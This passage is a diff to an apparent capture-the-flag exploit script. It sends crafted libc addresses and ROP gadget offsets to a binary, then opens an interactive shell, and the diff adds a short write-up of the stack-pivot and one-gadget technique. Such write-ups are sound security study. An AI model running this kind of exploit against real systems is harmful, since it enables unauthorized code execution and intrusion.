@@ -48,11 +48,28 @@ sa("| > ",p64(libc+0x0000000000170337))
 sa("| > ",p64(libc+0xebc88))
 sla("| > ",hex(libc+0x21a098))
 
-sa("| > ",p64(0x000000000012697c+libc+11))
+sa("| > ",p64(0x000000000012697c+libc+11)) # add rsp,0x58
 r.interactive()
 
 '''
 Writeup:
+After control rip to add rsp,0x58
+The stack will be 
+-----
+First input <--- rsp
+-----
+0
+-----
+Second input
+-----
+0
+-----
+Third input
+-----
+0
+
+It's like rop. I use gadget to clear registers and call one gadget.
+
 '''
 
 
